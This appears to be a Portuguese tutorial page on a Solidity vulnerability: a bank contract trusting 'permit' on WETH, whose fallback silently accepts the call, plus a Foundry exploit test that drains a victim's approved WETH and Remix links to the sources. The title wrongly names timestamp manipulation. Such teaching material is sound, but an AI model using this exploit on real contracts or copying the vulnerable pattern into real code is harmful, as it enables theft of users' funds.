# Manipulação do Bloco Timestamp

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

A maioria dos ERC20 tem a função `permit` para aprovar um gastador se for fornecida uma assinatura válida.

No entanto, o `WETH` não tem. Surpreendentemente, quando a `permit` é chamada no `WETH`, a chamada da função é executada sem nenhum erro.

Isso ocorre porque o `fallback` dentro do `WETH` é executado quando a `permit` é chamada.

</h4><a href="#example" id="example">Exemplo</a></h4>
O usuário 0 executa o depósito do usuário 1.

1. Alice dá aprovação infinita para que o `ERC20Bank` gaste `WETH`
2. Alice chama o `deposit`, deposita `1 WETH` no `ERC20Bank`
3. O atacante chama `depositWithPermit`, passa uma assinatura vazia e transfere todos os tokens de Alice para o `ERC20Bank`, creditando o depósito ao atacante.
4. O atacante retira todos os tokens creditados a ele.

</h4><a href="#ERC20Bank" id="ERC20Bank">ERC20Bank</a></h4>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import "./IERC20Permit.sol";

contract ERC20Bank {
    IERC20Permit public immutable token;
    mapping(address => uint256) public balanceOf;

    constructor(address _token) {
        token = IERC20Permit(_token);
    }

    function deposit(uint256 _amount) external {
        token.transferFrom(msg.sender, address(this), _amount);
        balanceOf[msg.sender] += _amount;
    }

    function depositWithPermit(
        address owner,
        address spender,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        token.permit(owner, spender, amount, deadline, v, r, s);
        token.transferFrom(owner, address(this), amount);
        balanceOf[spender] += amount;
    }

    function withdraw(uint256 _amount) external {
        balanceOf[msg.sender] -= _amount;
        token.transfer(msg.sender, _amount);
    }
}
```

</h4><a href="#exploit" id="exploit">Exploração</a></h4>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {WETH} from "../src/WETH.sol";
import {ERC20Bank} from "../src/ERC20Bank.sol";

contract ERC20BankExploitTest is Test {
    WETH private weth;
    ERC20Bank private bank;
    address private constant user = address(11);
    address private constant attacker = address(12);

    function setUp() public {
        weth = new WETH();
        bank = new ERC20Bank(address(weth));

        deal(user, 100 * 1e18);
        vm.startPrank(user);
        weth.deposit{value: 100 * 1e18}();
        weth.approve(address(bank), type(uint256).max);
        bank.deposit(1e18);
        vm.stopPrank();
    }

    function test() public {
        uint256 bal = weth.balanceOf(user);
        vm.startPrank(attacker);
        bank.depositWithPermit(user, attacker, bal, 0, 0, "", "");
        bank.withdraw(bal);
        vm.stopPrank();

        assertEq(weth.balanceOf(user), 0, "WETH balance of user");
        assertEq(
            weth.balanceOf(address(attacker)),
            99 * 1e18,
            "WETH balance of attacker"
        );
    }
}
```

</h4><a href="#other-contracts" id="other-contracts">Outros contratos</a></h4>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount)
        external
        returns (bool);

    event Transfer(address indexed src, address indexed dst, uint256 amount);
    event Approval(
        address indexed owner, address indexed spender, uint256 amount
    );
}
```

## Teste no Remix

* [ERC20.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIyOwoKYWJzdHJhY3QgY29udHJhY3QgRVJDMjAgewogICAgZXZlbnQgVHJhbnNmZXIoYWRkcmVzcyBpbmRleGVkIGZyb20sIGFkZHJlc3MgaW5kZXhlZCB0bywgdWludDI1NiBhbW91bnQpOwogICAgZXZlbnQgQXBwcm92YWwoCiAgICAgICAgYWRkcmVzcyBpbmRleGVkIG93bmVyLCBhZGRyZXNzIGluZGV4ZWQgc3BlbmRlciwgdWludDI1NiBhbW91bnQKICAgICk7CgogICAgc3RyaW5nIHB1YmxpYyBuYW1lOwogICAgc3RyaW5nIHB1YmxpYyBzeW1ib2w7CiAgICB1aW50OCBwdWJsaWMgaW1tdXRhYmxlIGRlY2ltYWxzOwoKICAgIHVpbnQyNTYgcHVibGljIHRvdGFsU3VwcGx5OwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpKSBwdWJsaWMgYWxsb3dhbmNlOwoKICAgIGNvbnN0cnVjdG9yKHN0cmluZyBtZW1vcnkgX25hbWUsIHN0cmluZyBtZW1vcnkgX3N5bWJvbCwgdWludDggX2RlY2ltYWxzKSB7CiAgICAgICAgbmFtZSA9IF9uYW1lOwogICAgICAgIHN5bWJvbCA9IF9zeW1ib2w7CiAgICAgICAgZGVjaW1hbHMgPSBfZGVjaW1hbHM7CiAgICB9CgogICAgZnVuY3Rpb24gYXBwcm92ZShhZGRyZXNzIHNwZW5kZXIsIHVpbnQyNTYgYW1vdW50KQogICAgICAgIHB1YmxpYwogICAgICAgIHZpcnR1YWwKICAgICAgICByZXR1cm5zIChib29sKQogICAgewogICAgICAgIGFsbG93YW5jZVttc2cuc2VuZGVyXVtzcGVuZGVyXSA9IGFtb3VudDsKICAgICAgICBlbWl0IEFwcHJvdmFsKG1zZy5zZW5kZXIsIHNwZW5kZXIsIGFtb3VudCk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgZnVuY3Rpb24gdHJhbnNmZXIoYWRkcmVzcyB0bywgdWludDI1NiBhbW91bnQpCiAgICAgICAgcHVibGljCiAgICAgICAgdmlydHVhbAogICAgICAgIHJldHVybnMgKGJvb2wpCiAgICB7CiAgICAgICAgYmFsYW5jZU9mW21zZy5zZW5kZXJdIC09IGFtb3VudDsKICAgICAgICB1bmNoZWNrZWQgewogICAgICAgICAgICBiYWxhbmNlT2ZbdG9dICs9IGFtb3VudDsKICAgICAgICB9CiAgICAgICAgZW1pdCBUcmFuc2Zlcihtc2cuc2VuZGVyLCB0bywgYW1vdW50KTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiB0cmFuc2ZlckZyb20oYWRkcmVzcyBmcm9tLCBhZGRyZXNzIHRvLCB1aW50MjU2IGFtb3VudCkKICAgICAgICBwdWJsaWMKICAgICAgICB2aXJ0dWFsCiAgICAgICAgcmV0dXJucyAoYm9vbCkKICAgIHsKICAgICAgICB1aW50MjU2IGFsbG93ZWQgPSBhbGxvd2FuY2VbZnJvbV1bbXNnLnNlbmRlcl07CiAgICAgICAgaWYgKGFsbG93ZWQgIT0gdHlwZSh1aW50MjU2KS5tYXgpIHsKICAgICAgICAgICAgYWxsb3dhbmNlW2Zyb21dW21zZy5zZW5kZXJdID0gYWxsb3dlZCAtIGFtb3VudDsKICAgICAgICB9CiAgICAgICAgYmFsYW5jZU9mW2Zyb21dIC09IGFtb3VudDsKICAgICAgICB1bmNoZWNrZWQgewogICAgICAgICAgICBiYWxhbmNlT2ZbdG9dICs9IGFtb3VudDsKICAgICAgICB9CiAgICAgICAgZW1pdCBUcmFuc2Zlcihmcm9tLCB0bywgYW1vdW50KTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiBfbWludChhZGRyZXNzIHRvLCB1aW50MjU2IGFtb3VudCkgaW50ZXJuYWwgdmlydHVhbCB7CiAgICAgICAgdG90YWxTdXBwbHkgKz0gYW1vdW50OwogICAgICAgIHVuY2hlY2tlZCB7CiAgICAgICAgICAgIGJhbGFuY2VPZlt0b10gKz0gYW1vdW50OwogICAgICAgIH0KICAgICAgICBlbWl0IFRyYW5zZmVyKGFkZHJlc3MoMCksIHRvLCBhbW91bnQpOwogICAgfQoKICAgIGZ1bmN0aW9uIF9idXJuKGFkZHJlc3MgZnJvbSwgdWludDI1NiBhbW91bnQpIGludGVybmFsIHZpcnR1YWwgewogICAgICAgIGJhbGFuY2VPZltmcm9tXSAtPSBhbW91bnQ7CiAgICAgICAgdW5jaGVja2VkIHsKICAgICAgICAgICAgdG90YWxTdXBwbHkgLT0gYW1vdW50OwogICAgICAgIH0KICAgICAgICBlbWl0IFRyYW5zZmVyKGZyb20sIGFkZHJlc3MoMCksIGFtb3VudCk7CiAgICB9Cn0K=&version=soljson-v0.8.20+commit.a1b79de6.js)
* [ERC20Bank.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIyOwoKaW1wb3J0ICIuL0lFUkMyMFBlcm1pdC5zb2wiOwoKY29udHJhY3QgRVJDMjBCYW5rIHsKICAgIElFUkMyMFBlcm1pdCBwdWJsaWMgaW1tdXRhYmxlIHRva2VuOwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlT2Y7CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfdG9rZW4pIHsKICAgICAgICB0b2tlbiA9IElFUkMyMFBlcm1pdChfdG9rZW4pOwogICAgfQoKICAgIGZ1bmN0aW9uIGRlcG9zaXQodWludDI1NiBfYW1vdW50KSBleHRlcm5hbCB7CiAgICAgICAgdG9rZW4udHJhbnNmZXJGcm9tKG1zZy5zZW5kZXIsIGFkZHJlc3ModGhpcyksIF9hbW91bnQpOwogICAgICAgIGJhbGFuY2VPZlttc2cuc2VuZGVyXSArPSBfYW1vdW50OwogICAgfQoKICAgIGZ1bmN0aW9uIGRlcG9zaXRXaXRoUGVybWl0KAogICAgICAgIGFkZHJlc3Mgb3duZXIsCiAgICAgICAgYWRkcmVzcyBzcGVuZGVyLAogICAgICAgIHVpbnQyNTYgYW1vdW50LAogICAgICAgIHVpbnQyNTYgZGVhZGxpbmUsCiAgICAgICAgdWludDggdiwKICAgICAgICBieXRlczMyIHIsCiAgICAgICAgYnl0ZXMzMiBzCiAgICApIGV4dGVybmFsIHsKICAgICAgICB0b2tlbi5wZXJtaXQob3duZXIsIHNwZW5kZXIsIGFtb3VudCwgZGVhZGxpbmUsIHYsIHIsIHMpOwogICAgICAgIHRva2VuLnRyYW5zZmVyRnJvbShvd25lciwgYWRkcmVzcyh0aGlzKSwgYW1vdW50KTsKICAgICAgICBiYWxhbmNlT2Zbc3BlbmRlcl0gKz0gYW1vdW50OwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KHVpbnQyNTYgX2Ftb3VudCkgZXh0ZXJuYWwgewogICAgICAgIGJhbGFuY2VPZlttc2cuc2VuZGVyXSAtPSBfYW1vdW50OwogICAgICAgIHRva2VuLnRyYW5zZmVyKG1zZy5zZW5kZXIsIF9hbW91bnQpOwogICAgfQp9Cg=&version=soljson-v0.8.20+commit.a1b79de6.js)
* [ERC20BankExploitTest.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIyOwoKaW1wb3J0IHtUZXN0LCBjb25zb2xlMn0gZnJvbSAiZm9yZ2Utc3RkL1Rlc3Quc29sIjsKaW1wb3J0IHtXRVRIfSBmcm9tICIuLi9zcmMvV0VUSC5zb2wiOwppbXBvcnQge0VSQzIwQmFua30gZnJvbSAiLi4vc3JjL0VSQzIwQmFuay5zb2wiOwoKY29udHJhY3QgRVJDMjBCYW5rRXhwbG9pdFRlc3QgaXMgVGVzdCB7CiAgICBXRVRIIHByaXZhdGUgd2V0aDsKICAgIEVSQzIwQmFuayBwcml2YXRlIGJhbms7CiAgICBhZGRyZXNzIHByaXZhdGUgY29uc3RhbnQgdXNlciA9IGFkZHJlc3MoMTEpOwogICAgYWRkcmVzcyBwcml2YXRlIGNvbnN0YW50IGF0dGFja2VyID0gYWRkcmVzcygxMik7CgogICAgZnVuY3Rpb24gc2V0VXAoKSBwdWJsaWMgewogICAgICAgIHdldGggPSBuZXcgV0VUSCgpOwogICAgICAgIGJhbmsgPSBuZXcgRVJDMjBCYW5rKGFkZHJlc3Mod2V0aCkpOwoKICAgICAgICBkZWFsKHVzZXIsIDEwMCAqIDFlMTgpOwogICAgICAgIHZtLnN0YXJ0UHJhbmsodXNlcik7CiAgICAgICAgd2V0aC5kZXBvc2l0e3ZhbHVlOiAxMDAgKiAxZTE4fSgpOwogICAgICAgIHdldGguYXBwcm92ZShhZGRyZXNzKGJhbmspLCB0eXBlKHVpbnQyNTYpLm1heCk7CiAgICAgICAgYmFuay5kZXBvc2l0KDFlMTgpOwogICAgICAgIHZtLnN0b3BQcmFuaygpOwogICAgfQoKICAgIGZ1bmN0aW9uIHRlc3QoKSBwdWJsaWMgewogICAgICAgIHVpbnQyNTYgYmFsID0gd2V0aC5iYWxhbmNlT2YodXNlcik7CiAgICAgICAgdm0uc3RhcnRQcmFuayhhdHRhY2tlcik7CiAgICAgICAgYmFuay5kZXBvc2l0V2l0aFBlcm1pdCh1c2VyLCBhdHRhY2tlciwgYmFsLCAwLCAwLCAiIiwgIiIpOwogICAgICAgIGJhbmsud2l0aGRyYXcoYmFsKTsKICAgICAgICB2bS5zdG9wUHJhbmsoKTsKCiAgICAgICAgYXNzZXJ0RXEod2V0aC5iYWxhbmNlT2YodXNlciksIDAsICJXRVRIIGJhbGFuY2Ugb2YgdXNlciIpOwogICAgICAgIGFzc2VydEVxKAogICAgICAgICAgICB3ZXRoLmJhbGFuY2VPZihhZGRyZXNzKGF0dGFja2VyKSksCiAgICAgICAgICAgIDk5ICogMWUxOCwKICAgICAgICAgICAgIldFVEggYmFsYW5jZSBvZiBhdHRhY2tlciIKICAgICAgICApOwogICAgfQp9Cg=&version=soljson-v0.8.20+commit.a1b79de6.js)
* [IERC20.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIyOwoKaW50ZXJmYWNlIElFUkMyMCB7CiAgICBmdW5jdGlvbiB0b3RhbFN1cHBseSgpIGV4dGVybmFsIHZpZXcgcmV0dXJucyAodWludDI1Nik7CiAgICBmdW5jdGlvbiBiYWxhbmNlT2YoYWRkcmVzcyBhY2NvdW50KSBleHRlcm5hbCB2aWV3IHJldHVybnMgKHVpbnQyNTYpOwogICAgZnVuY3Rpb24gYWxsb3dhbmNlKGFkZHJlc3Mgb3duZXIsIGFkZHJlc3Mgc3BlbmRlcikKICAgICAgICBleHRlcm5hbAogICAgICAgIHZpZXcKICAgICAgICByZXR1cm5zICh1aW50MjU2KTsKICAgIGZ1bmN0aW9uIGFwcHJvdmUoYWRkcmVzcyBzcGVuZGVyLCB1aW50MjU2IGFtb3VudCkgZXh0ZXJuYWwgcmV0dXJucyAoYm9vbCk7CiAgICBmdW5jdGlvbiB0cmFuc2ZlcihhZGRyZXNzIGRzdCwgdWludDI1NiBhbW91bnQpIGV4dGVybmFsIHJldHVybnMgKGJvb2wpOwogICAgZnVuY3Rpb24gdHJhbnNmZXJGcm9tKGFkZHJlc3Mgc3JjLCBhZGRyZXNzIGRzdCwgdWludDI1NiBhbW91bnQpCiAgICAgICAgZXh0ZXJuYWwKICAgICAgICByZXR1cm5zIChib29sKTsKCiAgICBldmVudCBUcmFuc2ZlcihhZGRyZXNzIGluZGV4ZWQgc3JjLCBhZGRyZXNzIGluZGV4ZWQgZHN0LCB1aW50MjU2IGFtb3VudCk7CiAgICBldmVudCBBcHByb3ZhbCgKICAgICAgICBhZGRyZXNzIGluZGV4ZWQgb3duZXIsIGFkZHJlc3MgaW5kZXhlZCBzcGVuZGVyLCB1aW50MjU2IGFtb3VudAogICAgKTsKfQo=&version=soljson-v0.8.20+commit.a1b79de6.js)
* [IERC20Permit.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIyOwoKaW1wb3J0ICIuL0lFUkMyMC5zb2wiOwoKaW50ZXJmYWNlIElFUkMyMFBlcm1pdCBpcyBJRVJDMjAgewogICAgZnVuY3Rpb24gcGVybWl0KAogICAgICAgIGFkZHJlc3Mgb3duZXIsCiAgICAgICAgYWRkcmVzcyBzcGVuZGVyLAogICAgICAgIHVpbnQyNTYgdmFsdWUsCiAgICAgICAgdWludDI1NiBkZWFkbGluZSwKICAgICAgICB1aW50OCB2LAogICAgICAgIGJ5dGVzMzIgciwKICAgICAgICBieXRlczMyIHMKICAgICkgZXh0ZXJuYWw7Cn0K&version=soljson-v0.8.20+commit.a1b79de6.js)
* [WETH.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgMC44LjIyOwoKaW1wb3J0ICIuL0VSQzIwLnNvbCI7Cgpjb250cmFjdCBXRVRIIGlzIEVSQzIwIHsKICAgIGV2ZW50IERlcG9zaXQoYWRkcmVzcyBpbmRleGVkIGFjY291bnQsIHVpbnQyNTYgYW1vdW50KTsKICAgIGV2ZW50IFdpdGhkcmF3KGFkZHJlc3MgaW5kZXhlZCBhY2NvdW50LCB1aW50MjU2IGFtb3VudCk7CgogICAgY29uc3RydWN0b3IoKSBFUkMyMCgiV3JhcHBlZCBFdGhlciIsICJXRVRIIiwgMTgpIHt9CgogICAgZmFsbGJhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICBkZXBvc2l0KCk7CiAgICB9CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICBfbWludChtc2cuc2VuZGVyLCBtc2cudmFsdWUpOwogICAgICAgIGVtaXQgRGVwb3NpdChtc2cuc2VuZGVyLCBtc2cudmFsdWUpOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KHVpbnQyNTYgYW1vdW50KSBleHRlcm5hbCB7CiAgICAgICAgX2J1cm4obXNnLnNlbmRlciwgYW1vdW50KTsKICAgICAgICBwYXlhYmxlKG1zZy5zZW5kZXIpLnRyYW5zZmVyKGFtb3VudCk7CiAgICAgICAgZW1pdCBXaXRoZHJhdyhtc2cuc2VuZGVyLCBhbW91bnQpOwogICAgfQp9Cg=&version=soljson-v0.8.20+commit.a1b79de6.js)
